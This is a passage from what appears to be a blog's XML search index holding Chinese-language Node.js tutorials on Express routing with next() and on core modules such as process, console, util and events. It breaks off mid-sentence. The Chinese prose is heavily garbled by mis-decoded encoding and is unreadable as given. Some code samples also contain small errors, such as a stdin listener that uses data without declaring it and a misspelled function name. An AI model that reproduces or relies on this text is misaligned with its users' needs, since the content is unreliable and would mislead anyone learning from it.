·çš„è§„åˆ™åŒ¹é…åˆ°çš„è·¯å¾„æ—¶ï¼Œä¼šå‘çŽ°è¯·æ±‚æ€»æ˜¯è¢«å‰ä¸€æ¡è·¯ç”±è§„åˆ™æ•èŽ·ï¼ŒåŽé¢çš„è§„åˆ™ä¼šè¢«å¿½ç•¥ã€‚åŽŸå› æ˜¯ Express åœ¨å¤„ç†è·¯ç”±è§„åˆ™æ—¶ï¼Œä¼šä¼˜å…ˆåŒ¹é…å…ˆå®šä¹‰çš„è·¯ç”±è§„åˆ™ï¼Œå› æ­¤åŽé¢ç›¸åŒçš„è§„åˆ™è¢«å±è”½ã€‚ Express æä¾›äº†è·¯ç”±æŽ§åˆ¶æƒè½¬ç§»çš„æ–¹æ³•ï¼Œå³å›žè°ƒå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•° next ï¼Œé€šè¿‡è°ƒç”¨next() ï¼Œä¼šå°†è·¯ç”±æŽ§åˆ¶æƒè½¬ç§»ç»™åŽé¢çš„è§„åˆ™ï¼Œä¾‹å¦‚ï¼š 1234567app.all('/user/:username', function(req, res) &#123; res.send('all methods captured'); next();&#125;);app.get('/user/:username', function(req, res) &#123; res.send('user: ' + req.params.username);&#125;); å½“è®¿é—®è¢«åŒ¹é…åˆ°çš„è·¯å¾„æ—¶ï¼Œå¦‚ http://localhost:3000/user/lbh ï¼Œä¼šå‘çŽ°ç»ˆç«¯ä¸­æ‰“å°äº† all methods captured ï¼Œè€Œä¸”æµè§ˆå™¨ä¸­æ˜¾ç¤ºäº† user: lbh ã€‚è¿™è¯´æ˜Žè¯·æ±‚å…ˆè¢«ç¬¬ä¸€æ¡è·¯ç”±è§„åˆ™æ•èŽ·ï¼Œå®Œæˆ console.log ä½¿ç”¨ next() è½¬ç§»æŽ§åˆ¶æƒï¼Œåˆè¢«ç¬¬äºŒæ¡è§„åˆ™æ•èŽ·ï¼Œå‘æµè§ˆå™¨è¿”å›žäº†ä¿¡æ¯ã€‚ è¿™æ˜¯ä¸€ä¸ªéžå¸¸æœ‰ç”¨çš„å·¥å…·ï¼Œå¯ä»¥è®©æˆ‘ä»¬è½»æ˜“åœ°å®žçŽ°ä¸­é—´ä»¶ï¼Œè€Œä¸”è¿˜èƒ½æé«˜ä»£ç çš„å¤ç”¨ç¨‹åº¦ã€‚ä¾‹å¦‚æˆ‘ä»¬é’ˆå¯¹ä¸€ä¸ªç”¨æˆ·æŸ¥è¯¢ä¿¡æ¯å’Œä¿®æ”¹ä¿¡æ¯çš„æ“ä½œï¼Œåˆ†åˆ«å¯¹åº”äº† GET å’Œ PUT æ“ä½œï¼Œè€Œä¸¤è€…å…±æœ‰çš„ä¸€ä¸ªæ­¥éª¤æ˜¯æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦åˆæ³•ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ next() æ–¹æ³•å®žçŽ°ï¼š 1234567891011121314151617181920212223// router/users.jsvar users = &#123; 'lbh': &#123; name: 'lbh', website: 'http://laibh.top' &#125;&#125;;router.all('/:username', function (req, res, next) &#123; // æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å­˜åœ¨ if (users[req.params.username]) &#123; next(); &#125; else &#123; next(new Error(req.params.username + ' does not exist.')); &#125;&#125;);router.get('/:username', function (req, res) &#123; // ç”¨æˆ·ä¸€å®šå­˜åœ¨ï¼Œç›´æŽ¥å±•ç¤º res.send(JSON.stringify(users[req.params.username]));&#125;);router.put('/:username', function (req, res) &#123; // ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ res.send('Done');&#125;); è®¿é—® http://localhost:3000/users/lbh å¯ä»¥çœ‹åˆ°ï¼š {â€œnameâ€:â€lbhâ€,â€websiteâ€:â€http://laibh.top&quot;} è®¿é—®å…¶ä»–ç½‘å€ï¼Œä¾‹å¦‚ï¼š http://localhost:3000/users/xxxï¼Œåˆ™ä¼šå‡ºçŽ° xxx does not exist. ä¸Šé¢ä¾‹å­ä¸­ï¼Œ router.all å®šä¹‰çš„è¿™ä¸ªè·¯ç”±è§„åˆ™å®žé™…ä¸Šèµ·åˆ°äº†ä¸­é—´ä»¶çš„ä½œç”¨ï¼ŒæŠŠç›¸ä¼¼è¯·æ±‚çš„ç›¸åŒéƒ¨åˆ†æå–å‡ºæ¥ï¼Œæœ‰åˆ©äºŽä»£ç ç»´æŠ¤å…¶ä»– next æ–¹æ³•å¦‚æžœæŽ¥å—äº†å‚æ•°ï¼Œå³ä»£è¡¨å‘ç”Ÿäº†é”™è¯¯ã€‚ä½¿ç”¨è¿™ç§æ–¹æ³•å¯ä»¥æŠŠé”™è¯¯æ£€æŸ¥åˆ†æ®µåŒ–ï¼Œé™ä½Žä»£ç è€¦åˆåº¦ã€‚ æœªå®Œå¾…ç»­ï¼ŒåŽé¢å³å°†è®²æ¨¡æ¿å¼•æ“Žã€å»ºç«‹å¾®åšç½‘ç«™ã€ç”¨æˆ·æ³¨å†Œç™»å½•ã€å‘è¡¨å¾®åšç­‰ç­‰]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¥½çŽ©çš„Nodejs â€”â€” Node.jsæ ¸å¿ƒæ¨¡å—]]></title>
    <url>%2F2018-09-20-NodeJs-Part4.html</url>
    <content type="text"><![CDATA[æ ¸å¿ƒæ¨¡å—æ˜¯ Node.js çš„å¿ƒè„ï¼Œå®ƒç”±ä¸€äº›ç²¾ç®€è€Œé«˜æ•ˆçš„åº“ç»„æˆï¼Œä¸ºNode.js æä¾›äº†åŸºæœ¬çš„ APIã€‚æœ¬ç« ä¸»è¦å†…å®¹ï¼š å…¨å±€å¯¹è±¡ å¸¸ç”¨å·¥å…· äº‹ä»¶æœºåˆ¶ æ–‡ä»¶ç³»ç»Ÿè®¿é—® HTTP æœåŠ¡å™¨ä¸Žå®¢æˆ·ç«¯ è¿™ä¸€ç« æ¯”è¾ƒé‡è¦ï¼Œæ‰€ä»¥å­—æ•°æ¯”è¾ƒå¤šã€‚ Node.jsæ ¸å¿ƒæ¨¡å—å…¨å±€å¯¹è±¡JavaScript ä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡ï¼Œç§°ä¸ºå…¨å±€å¯¹è±¡ï¼ˆGlobal Objectï¼‰ï¼Œå®ƒåŠå…¶ä»–å±žæ€§éƒ½å¯ä»¥åœ¨ç¨‹åºçš„ä»»ä½•åœ°æ–¹è®¿é—®ï¼Œå³å…¨å±€å˜é‡ã€‚åœ¨æµè§ˆå™¨ JavaScript ä¸­ï¼Œé€šå¸¸ window æ˜¯å…¨å±€å¯¹è±¡ï¼Œè€Œ Node.js ä¸­çš„å…¨å±€å¯¹è±¡æ˜¯ global,æ‰€æœ‰å…¨å±€å˜é‡ï¼ˆé™¤äº† global æœ¬èº«ä»¥å¤–ï¼‰éƒ½æ˜¯ global å¯¹è±¡çš„å±žæ€§ã€‚ å…¨å±€å¯¹è±¡ä¸Žå…¨å±€å˜é‡global æœ€æ ¹æœ¬çš„ä½œç”¨æ˜¯ä½œä¸ºå…¨å±€å˜é‡çš„å®¿ä¸»ï¼ŒæŒ‰ç…§ ECMAScript çš„å®šä¹‰ï¼Œæ»¡è¶³ä¸€ä¸‹æ¡ä»¶çš„å˜é‡æ˜¯å…¨å±€å˜é‡ï¼š åœ¨æœ€å¤–å±‚å®šä¹‰çš„å˜é‡ å…¨å±€å¯¹è±¡çš„å±žæ€§ éšå¼å®šä¹‰çš„å˜é‡ï¼ˆæœªå®šä¹‰ç›´æŽ¥èµ‹å€¼çš„å˜é‡ï¼‰ Node.js ä¸­ ä¸å¯èƒ½åœ¨æœ€å¤–å±‚å®šä¹‰å˜é‡ï¼Œå› ä¸ºæ‰€æœ‰ç”¨æˆ·ä»£ç éƒ½æ˜¯å±žäºŽå½“å‰æ¨¡å—çš„ï¼Œè€Œæ¨¡å—æœ¬èº«ä¸æ˜¯æœ€å¤–å±‚ä¸Šä¸‹æ–‡ã€‚ processprocess æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå³ global å¯¹è±¡çš„å±žæ€§ï¼Œå®ƒç”¨äºŽæè¿°å½“å‰çš„ Node.js è¿›ç¨‹çŠ¶æ€çš„å¯¹è±¡ï¼Œæä¾›äº†ä¸€ä¸ªä¸Žæ“ä½œç³»ç»Ÿçš„ç®€å•æŽ¥å£ã€‚é€šå¸¸ç”¨äºŽå†™æœ¬åœ°å‘½ä»¤è¡Œç¨‹åºçš„æ—¶å€™ã€‚ ä»¥ä¸‹ä»‹ç» process å¯¹è±¡çš„ä¸€äº›æœ€ç®€å•çš„æˆå‘˜æ–¹æ³•ã€‚ process.argvå‘½ä»¤è¡Œå‚æ•°æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ node,ç¬¬äºŒä¸ªå…ƒç´ æ˜¯è„šæœ¬æ–‡ä»¶åï¼Œä»Žç¬¬ä¸‰ä¸ªå…ƒç´ å¼€å§‹æ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªè¿è¡Œå‚æ•° 1console.log(process.argv); å°†ä»¥ä¸Šä»£ç å­˜å‚¨ä¸º argv.jsï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿è¡Œï¼š 1234567891011121314151617181920Microsoft Windows [ç‰ˆæœ¬ 6.1.7601]ç‰ˆæƒæ‰€æœ‰ (c) 2009 Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚C:\Users\Administrator&gt;cd DesktopC:\Users\Administrator\Desktop&gt;cd nodeJsC:\Users\Administrator\Desktop\nodeJs&gt;node argv.js[ 'E:\\Program Files\\NodeJS\\node.exe', 'C:\\Users\\Administrator\\Desktop\\nodeJs\\argv.js' ]C:\Users\Administrator\Desktop\nodeJs&gt;node argv.js 2018 name=lbh --v "Lbh"[ 'E:\\Program Files\\NodeJS\\node.exe', 'C:\\Users\\Administrator\\Desktop\\nodeJs\\argv.js', '2018', 'name=lbh', '--v', 'Lbh' ]C:\Users\Administrator\Desktop\nodeJs&gt; process.stdoutæ˜¯æ ‡å‡†è¾“å‡ºæµï¼Œé€šå¸¸ä½¿ç”¨çš„ console.log(),æƒ³æ ‡å‡†è¾“å‡ºæ‰“å°å­—ç¬¦ï¼Œè€Œ process.stdout.write()å‡½æ•°æä¾›äº†æ›´åº•å±‚çš„æŽ¥å£ã€‚ process.stdinæ˜¯æ ‡å‡†è¾“å…¥æµï¼Œåˆå§‹æ—¶å®ƒæ˜¯è¢«æš‚åœçš„ï¼Œè¦æƒ³ä»Žæ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ï¼Œä½ å¿…é¡»æ¢å¤æµï¼Œå¹¶æ‰‹åŠ¨ç¼–å†™æµçš„äº‹ä»¶å“åº”å‡½æ•°ã€‚ 12345process.stdin.resume();process.stdin.on('data', function()&#123; process.stdout.write('read from console:' + data.toString());&#125;); process.nextTick(callback)ä¸ºæ—¶é—´å¾ªçŽ¯è®¾ç½®ä¸€é¡¹ä»»åŠ¡ï¼ŒNodeJs ä¼šåœ¨ä¸‹æ¬¡äº‹ä»¶å¾ªçŽ¯è°ƒå“åº”æ—¶è°ƒç”¨ callback ã€‚ å› ä¸ºä¸€ä¸ª Node.js è¿›ç¨‹åªæœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œå› æ­¤åœ¨ä»»ä½•æ—¶åˆ»éƒ½åªæœ‰ä¸€ä¸ªäº‹ä»¶åœ¨æ‰§è¡Œã€‚å¦‚æžœè¿™ä¸ªäº‹ä»¶å ç”¨å¤§é‡çš„ CPU æ—¶é—´ï¼Œæ‰§è¡Œäº‹ä»¶å¾ªçŽ¯ä¸­çš„ä¸‹ä¸€ä¸ªäº‹ä»¶å°±éœ€è¦ç­‰å¾…å¾ˆä¹…ï¼Œå› æ­¤ Node.js çš„ä¸€ä¸ªç¼–ç¨‹åŽŸåˆ™å°±æ˜¯å°½é‡ç¼©çŸ­æ¯ä¸ªäº‹ä»¶çš„æ‰§è¡Œæ—¶é—´ã€‚ process.nextTick() æä¾›äº†ä¸€ä¸ªè¿™æ ·çš„å·¥å…·ï¼Œå¯ä»¥æŠŠå¤æ‚çš„å·¥ä½œæ‹†æ•£ï¼Œå˜æˆä¸€ä¸ªä¸ªè¾ƒå°çš„äº‹ä»¶ã€‚ 1234567function doSometing(args, callback) &#123; somethingComplicated(args); callback();&#125;doSomething(function onEnd()&#123; compute();&#125;) å‡è®¾ compute() å’Œ somethingComplicated() æ˜¯ä¸¤ä¸ªè¾ƒä¸ºè€—æ—¶çš„å‡½æ•°ï¼Œä»¥ä¸Šçš„ç¨‹åºåœ¨è°ƒç”¨ doSomething() æ—¶ä¼šå…ˆæ‰§è¡Œ somethingComplicated() ï¼Œç„¶åŽç«‹å³è°ƒç”¨å›žè°ƒå‡½æ•°ï¼Œåœ¨ onEnd() ä¸­åˆä¼šæ‰§è¡Œ compute() ã€‚ä¸‹é¢ç”¨ process.nextTick() æ”¹å†™ä¸Šé¢çš„ç¨‹åºï¼š 1234567function doSomething(args, callback)&#123; somethingComplicated(args); process.nextTick(callback);&#125;doSomething(function onEnd()&#123; compute();&#125;) æ”¹å†™åŽçš„ç¨‹åºä¼šæŠŠä¸Šé¢è€—æ—¶çš„æ“ä½œæ‹†åˆ†ä¸ºä¸¤ä¸ªäº‹ä»¶ï¼Œå‡å°‘æ¯ä¸ªäº‹ä»¶çš„æ‰§è¡Œæ—¶é—´ï¼Œæé«˜äº‹ä»¶å“åº”é€Ÿåº¦ã€‚ä¸è¦ä½¿ç”¨ setTimeout(fn,0) ä»£æ›¿ process.nextTick(callback) ï¼Œå‰è€…æ¯”åŽè€…æ•ˆçŽ‡è¦ä½Žå¾—å¤šã€‚ å…¶ä»–æœ‰å…³çš„ï¼Œ process api consoleconsole ç”¨äºŽæä¾›æŽ§åˆ¶å°æ ‡å‡†è¾“å‡ºï¼Œå‘æ ‡å‡†è¾“å‡ºæµï¼ˆstdoutï¼‰æˆ–æ ‡å‡†é”™è¯¯æµï¼ˆstderrï¼‰è¾“å‡ºå­—ç¬¦ã€‚ console.log()æƒ³æ ‡å‡†è¾“å‡ºæµæ‰“å°å­—ç¬¦å¹¶æ¢è¡Œç¬¦ç»“æŸã€‚console.log æŽ¥å—è‹¥å¹²ä¸ªå‚æ•°ï¼Œå¦‚æžœåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œåˆ™è¾“å‡ºè¿™ä¸ªå‚æ•°çš„å­—ç¬¦ä¸²å½¢å¼ï¼Œå¦‚æžœæœ‰å¤šä¸ªå‚æ•°ï¼Œåˆ™ä»¥ç±»ä¼¼ C è¯­è¨€ printf() å‘½ä»¤çš„æ ¼å¼è¾“å‡ºã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æžœæ²¡æœ‰å‚æ•°ï¼Œåªæ‰“å°ä¸€ä¸ªæ¢è¡Œã€‚ console.error()ä¸Ž console.log() ç”¨æ³•ç›¸åŒï¼Œåªæ˜¯å‘æ ‡å‡†é”™è¯¯æµè¾“å‡ºã€‚ console.trace()å‘æ ‡å‡†é”™è¯¯æµè¾“å‡ºå½“å‰çš„è°ƒç”¨æ ˆã€‚ 1console.trace (); è¿è¡Œç»“æžœä¸ºï¼š 123456789101112131415C:\Users\Administrator\Desktop\nodeJs&gt;node consoletrace.jsTrace at Object.&lt;anonymous&gt; (C:\Users\Administrator\Desktop\nodeJs\consoletrace.js:1:71) at Module._compile (module.js:652:30) at Object.Module._extensions..js (module.js:663:10) at Module.load (module.js:565:32) at tryModuleLoad (module.js:505:12) at Function.Module._load (module.js:497:3) at Function.Module.runMain (module.js:693:10) at startup (bootstrap_node.js:191:16) at bootstrap_node.js:612:3C:\Users\Administrator\Desktop\nodeJs&gt; å¸¸ç”¨å·¥å…· utilutil æ˜¯ä¸€ä¸ª Node.js æ ¸å¿ƒæ¨¡å—ï¼Œæä¾›å¸¸ç”¨å‡½æ•°çš„é›†åˆï¼Œç”¨äºŽå¼¥è¡¥æ ¸å¿ƒ JavaScript çš„åŠŸèƒ½è¿‡äºŽç²¾ç®€çš„ä¸è¶³ã€‚ util.inheritsutil.inherits(constructor, superConstructor) æ˜¯ä¸€ä¸ªå®žçŽ°å¯¹è±¡é—´åŽŸåž‹ç»§æ‰¿çš„å‡½æ•°ã€‚JavaScript é¢å‘å¯¹è±¡ç‰¹æ€§æ˜¯åŸºäºŽåŽŸåž‹çš„ï¼Œä¸Žå¸¸è§çš„åŸºäºŽç±»çš„ä¸åŒã€‚JavaScript æ²¡æœ‰æä¾›å¯¹è±¡ç»§æ‰¿çš„è¯­è¨€çº§åˆ«ç‰¹æ€§ï¼Œè€Œæ˜¯é€šè¿‡åŽŸåž‹å¤åˆ¶æ¥å®žçŽ°çš„ã€‚ util.inherits çš„ç”¨æ³• 123456789101112131415161718192021222324252627// util.inheritsvar util = require('util');function Base()&#123; this.name = 'base'; this.base = 2018; this.sayHello = function() &#123; console.log('Hello' + this.name); &#125;&#125;Base.prototype.showName = function()&#123; console.log(this.name);&#125;function Sub()&#123; this.name = 'sub';&#125;util.inherits(Sub, Base);var objBase = new Base();objBase.showName();objBase.sayHello();console.log(objBase);var objSub = new Sub();objSub.showName();// objSub.sayHello();console.log(objSub); è¿è¡Œç»“æžœ 1234567C:\Users\Administrator\Desktop\nodeJs&gt;node util.inherits.jsbaseHellobaseBase &#123; name: 'base', base: 2018, sayHello: [Function] &#125;subSub &#123; name: 'sub' &#125; ä¸Šé¢ä¾‹å­å®šä¹‰äº†ä¸€ä¸ªåŸºç¡€å¯¹è±¡ Base å’Œä¸€ä¸ªç»§æ‰¿è‡ª Base çš„ Sub ï¼Œ Base æœ‰ä¸‰ä¸ªåœ¨æž„é€ å‡½æ•°å†…å®šä¹‰çš„å±žæ€§å’Œä¸€ä¸ªåŽŸåž‹ä¸­å®šä¹‰çš„å‡½æ•°ï¼Œé€šè¿‡ util.inherits å®žçŽ°ç»§æ‰¿ã€‚å¯ä»¥çœ‹åˆ° Sub ä»…ä»…ç»§æ‰¿äº† Base åœ¨åŽŸåž‹ä¸­å®šä¹‰çš„å‡½æ•°ï¼Œè€Œæž„é€ å‡½æ•°å†…éƒ¨åˆ›å»ºçš„å±žæ€§ä¸ä¼šè¢« console.log ä½œä¸ºå¯¹è±¡çš„å±žæ€§è¾“å‡ºã€‚å¦‚æžœåŽ»æŽ‰ objSub.sayHello(); è¿™è¡Œçš„æ³¨é‡Šï¼Œå°†ä¼šçœ‹åˆ°ï¼š 12345678910111213141516C:\Users\Administrator\Desktop\nodeJs\util.inherits.js:26objSub.sayHello(); ^TypeError: objSub.sayHello is not a function at Object.&lt;anonymous&gt; (C:\Users\Administrator\Desktop\nodeJs\util.inherits.js:26:8) at Module._compile (module.js:652:30) at Object.Module._extensions..js (module.js:663:10) at Module.load (module.js:565:32) at tryModuleLoad (module.js:505:12) at Function.Module._load (module.js:497:3) at Function.Module.runMain (module.js:693:10) at startup (bootstrap_node.js:191:16) at bootstrap_node.js:612:3 util.inspectutil.inspectï¼ˆobject, [showHidden], [depth]. [colors]ï¼‰æ˜¯ä¸€ä¸ªå°†ä»»æ„å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œé€šå¸¸ç”¨äºŽè°ƒè¯•å’Œé”™è¯¯è¾“å‡ºã€‚å®ƒè‡³å°‘æŽ¥å—ä¸€ä¸ªå‚æ•° object ï¼Œå³è¦è½¬æ¢çš„å¯¹è±¡ã€‚ showHidden æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œå¦‚æžœå€¼ä¸º trueï¼Œå°†ä¼šè¾“å‡ºæ›´å¤šéšè—ä¿¡æ¯ã€‚ depth è¡¨ç¤ºæœ€å¤§é€’å½’çš„æˆç†Ÿï¼Œå¦‚æžœå¯¹è±¡å¾ˆå¤æ‚ã€‚å¯ä»¥æŒ‡å®šå±‚æ•°ä»¥æŽ§åˆ¶è¾“å‡ºæ¶ˆæ¯çš„å¯¹å°‘ï¼Œå¦‚æžœä¸æŒ‡å®š depth,é»˜è®¤ä¼šé€’å½’ 2 å±‚ï¼Œ æŒ‡å®š null è¡¨ç¤ºå°†ä¸é™é€’å½’å±‚æ•°å®Œæ•´éåŽ†å¯¹è±¡ã€‚ colors çš„å€¼ä¸ºtrue,è¾“å‡ºæ ¼å¼å°†ä¼šä»¥ ANSIé¢œè‰²ç¼–ç ï¼Œé€šå¸¸ç”¨äºŽåœ¨ç»ˆç«¯æ˜¾ç¤ºæ›´æ¼‚äº®çš„æ•ˆæžœã€‚ ç‰¹åˆ«è¦æŒ‡å‡ºçš„æ˜¯ï¼Œ util.inspect å¹¶ä¸ä¼šç®€å•åœ°ç›´æŽ¥æŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå³ä½¿è¯¥å¯¹è±¡å®šä¹‰äº† toString æ–¹æ³•ä¹Ÿä¸ä¼šè°ƒç”¨ã€‚ 123456789101112// util.inspectvar util = require('util');function Person() &#123; this.name = 'lbh' this.toString = function()&#123; return this.name &#125;&#125;var obj = new Person();console.log(util.inspect(obj));console.log(util.inspect(obj, true)); è¿è¡Œç»“æžœ 123456789101112C:\Users\Administrator\Desktop\nodeJs&gt;node util.inspect.jsPerson &#123; name: 'lbh', toString: [Function] &#125;Person &#123; name: 'lbh', toString: &#123; [Function] [length]: 0, [name]: '', [arguments]: null, [caller]: null, [prototype]: &#123; [constructor]: [Circular] &#125; &#125; &#125; å½“è®¾ç½®æœ‰é¢œè‰²çš„è¾“å‡º 1console.log(util.inspect(obj, true, true,43)); ç»“æžœå¦‚ä¸‹ util è¿˜æä¾›äº† util.isArray() ã€ util.isRegExp() ã€util.isDate() ã€ util.isError() å››ä¸ªç±»åž‹æµ‹è¯•å·¥å…·ï¼Œä»¥åŠ util.format() ã€ util.debug() è¯¦æƒ…ç‚¹å‡» äº‹ä»¶é©±åŠ¨ eventsevents æ˜¯ Node.js æœ€é‡è¦çš„æ¨¡å—ï¼Œæ²¡æœ‰â€œä¹‹ä¸€â€ï¼ŒåŽŸå› æ˜¯ Node.js æœ¬èº«æž¶æž„å°±æ˜¯äº‹ä»¶å¼çš„ï¼Œè€Œå®ƒæä¾›äº†å”¯ä¸€çš„æŽ¥å£ï¼Œæ‰€ä»¥å ªç§° Node.js äº‹ä»¶ç¼–ç¨‹çš„åŸºçŸ³ã€‚ events æ¨¡å—ä¸ä»…ç”¨äºŽç”¨æˆ·ä»£ç ä¸Ž Node.js ä¸‹å±‚äº‹ä»¶å¾ªçŽ¯çš„äº¤äº’ï¼Œè¿˜å‡ ä¹Žè¢«æ‰€æœ‰çš„æ¨¡å—ä¾èµ–ã€‚ äº‹ä»¶å‘å°„å™¨events æ¨¡å—åªæä¾›äº†ä¸€ä¸ªå¯¹è±¡ï¼ševent.EventEmitterã€‚ EventEmitter çš„æ ¸å¿ƒå°±æ˜¯äº‹ä»¶å‘å°„ä¸Žäº‹ä»¶ç›‘å¬å™¨åŠŸèƒ½çš„å°è£…ã€‚ EventEmitter çš„æ¯ä¸ªäº‹ä»¶ç”±ä¸€ä¸ªäº‹ä»¶åå’Œè‹¥å¹²å‚æ•°ç»„æˆï¼Œäº‹ä»¶åæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé€šå¸¸è¡¨è¾¾ä¸€å®šçš„è¯­ä¹‰ã€‚å¯¹äºŽæ¯ä¸€ä¸ªäº‹ä»¶ï¼ŒEventEmitteræ”¯æŒè‹¥å¹²ä¸ªäº‹ä»¶ç›‘å¬å™¨ã€‚å½“äº‹ä»¶å‘å°„æ—¶ï¼Œæ³¨å†Œåˆ°è¿™ä¸ªäº‹ä»¶çš„äº‹ä»¶ç›‘å¬å™¨è¢«ä¾æ¬¡è°ƒç”¨ï¼Œäº‹ä»¶å‚æ•°ä½œä¸ºå›žè°ƒå‡½æ•°å‚æ•°ä¼ é€’ã€‚ ä¾‹å­ï¼š 1234567891011// eventsvar events = require('events');var emitter = new events.EventEmitter();emitter.on('someEvent', function(arg1, arg2)&#123; console.log('listener1', arg1, arg2);&#125;);emitter.on('someEvent', function(arg1, arg2)&#123; console.log('listener2', arg1, arg2);&#125;);emitter.emit('someEvent', 'lbh', 2018); è¿è¡Œç»“æžœï¼š 1234C:\Users\Administrator\Desktop\nodeJs&gt;node events.jslistener1 lbh 2018listener2 lbh 2018 ä»¥ä¸Šä¾‹å­ï¼Œemitter ä¸ºäº‹ä»¶ someEvent æ³¨å†Œäº†ä¸¤ä¸ªäº‹ä»¶ç›‘å¬å™¨ï¼Œç„¶åŽå‘å°„äº† someEvent äº‹ä»¶ã€‚è¿è¡Œç»“æžœä¸­å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªäº‹ä»¶ç›‘å¬å™¨å›žè°ƒå‡½æ•°å…ˆè¢«è°ƒç”¨ã€‚ EventEmitter å¸¸ç”¨çš„APIã€‚ EventEmitter.on(event, listener) ä¸ºæŒ‡å®šäº‹ä»¶æ³¨å†Œä¸€ä¸ªç›‘å¬å™¨ï¼ŒæŽ¥å—ä¸€ä¸ªå­—ç¬¦ä¸² event å’Œä¸€ä¸ªå›žè°ƒå‡½æ•° listener EventEmitter.emit(event, [arg1], [arg2], [...]) å‘å°„ event äº‹ä»¶ï¼Œä¼ é€’è‹¥å¹²å¯é€‰å‚æ•°åˆ°äº‹ä»¶ç›‘å¬å™¨çš„å‚æ•°è¡¨ã€‚ EventEmitter.once(event, listener) ä¸ºäº‹ä»¶æ³¨å†Œä¸€ä¸ªå•æ¬¡ç›‘å¬å™¨ï¼Œå³ç›‘å¬å™¨æœ€å¤šä¼šè§¦å‘ä¸€æ¬¡ï¼Œè§¦å‘åŽå°±ç«‹åˆ»è§£é™¤è¯¥ç›‘å¬å™¨ EventEmitter.removeListener(event, listener) ç§»é™¤æŒ‡å®šäº‹ä»¶çš„æŸä¸ªç›‘å¬å™¨ï¼Œ listener å¿…é¡»æ˜¯è¯¥äº‹ä»¶å·²ç»æ³¨å†Œè¿‡çš„ç›‘å¬å™¨ã€‚ EventEmitter.removeAllListeners([event]) ç§»é™¤æ‰€æœ‰äº‹ä»¶çš„æ‰€æœ‰ç›‘å¬å™¨ï¼Œå¦‚æžœæŒ‡å®š eventï¼Œåˆ™ç§»é™¤æŒ‡å®šäº‹ä»¶çš„æ‰€æœ‰ç›‘å¬å™¨ã€‚ æ›´å¤šè¯¦æƒ…ç‚¹å‡» error äº‹ä»¶EventEmitter å®šä¹‰äº†ä¸€ä¸ªç‰¹æ®Šçš„äº‹ä»¶ error ï¼Œå®ƒåŒ…å«äº†â€œé”™è¯¯â€çš„è¯­ä¹‰ï¼Œæˆ‘ä»¬åœ¨é‡åˆ°å¼‚å¸¸çš„æ—¶å€™é€šå¸¸ä¼šå‘å°„ error äº‹ä»¶ã€‚å½“ error è¢«å‘å°„æ—¶ï¼Œ EventEmitter è§„å®šå¦‚æžœæ²¡æœ‰å“åº”çš„ç›‘å¬å™¨ï¼ŒNode.js ä¼šæŠŠå®ƒå½“ä½œå¼‚å¸¸ï¼Œé€€å‡ºç¨‹åºå¹¶æ‰“å°è°ƒç”¨æ ˆã€‚æˆ‘ä»¬ä¸€èˆ¬è¦ä¸ºä¼šå‘å°„ error äº‹ä»¶çš„å¯¹è±¡è®¾ç½®ç›‘å¬å™¨ï¼Œé¿å…é‡åˆ°é”™è¯¯åŽæ•´ä¸ªç¨‹åºå´©æºƒã€‚ ç»§æ‰¿ EventEmitterå¤§å¤šæ•°æ—¶å€™æˆ‘ä»¬ä¸ä¼šç›´æŽ¥ä½¿ç”¨ EventEmitter ï¼Œè€Œæ˜¯åœ¨å¯¹è±¡ä¸­ç»§æ‰¿å®ƒã€‚åŒ…æ‹¬ fs ã€ net ã€http åœ¨å†…çš„ï¼Œåªè¦æ˜¯æ”¯æŒäº‹ä»¶å“åº”çš„æ ¸å¿ƒæ¨¡å—éƒ½æ˜¯ EventEmitter çš„å­ç±»ã€‚ ä¸ºä»€ä¹ˆè¦è¿™æ ·åšå‘¢ï¼ŸåŽŸå› æœ‰ä¸¤ç‚¹ã€‚é¦–å…ˆï¼Œå…·æœ‰æŸä¸ªå®žä½“åŠŸèƒ½çš„å¯¹è±¡å®žçŽ°äº‹ä»¶ç¬¦åˆè¯­ä¹‰ï¼Œäº‹ä»¶çš„ç›‘å¬å’Œå‘å°„åº”è¯¥æ˜¯ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ã€‚å…¶æ¬¡ JavaScript çš„å¯¹è±¡æœºåˆ¶æ˜¯åŸºäºŽåŽŸåž‹çš„ï¼Œæ”¯æŒéƒ¨åˆ†å¤šé‡ç»§æ‰¿ï¼Œç»§æ‰¿ EventEmitter ä¸ä¼šæ‰“ä¹±å¯¹è±¡åŽŸæœ‰çš„ç»§æ‰¿å…³ç³»ã€‚ æ–‡ä»¶ç³»ç»Ÿ fsfs æ¨¡å—æ˜¯æ–‡ä»¶æ“ä½œçš„å°è£…ï¼Œå®ƒæä¾›äº†æ–‡ä»¶çš„è¯»å–ã€å†™å…¥ã€æ›´åã€åˆ é™¤ã€éåŽ†ç›®å½•ã€é“¾æŽ¥ç­‰ POSIX æ–‡ä»¶ç³»ç»Ÿæ“ä½œã€‚ä¸Žå…¶ä»–æ¨¡å—ä¸åŒçš„æ˜¯ï¼Œfs 